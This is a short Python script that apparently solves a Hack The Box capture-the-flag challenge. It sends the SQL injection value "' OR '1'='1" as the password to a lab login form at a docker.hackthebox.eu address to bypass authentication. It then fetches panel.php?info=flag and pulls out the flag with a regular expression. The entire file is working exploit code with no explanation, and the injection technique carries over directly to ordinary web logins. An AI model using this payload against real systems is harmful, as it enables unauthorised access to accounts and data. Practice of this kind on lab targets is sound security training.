#!/usr/local/bin/python3

import requests
import re

s = requests.session()

url = 'http://docker.hackthebox.eu:37818/'

s.post(url, data={'username': '', 'password': "' OR '1'='1"})

response = s.get(url + 'panel.php?info=flag')

flag = re.findall('HTB{.*}', response.text)[0]
print(flag)
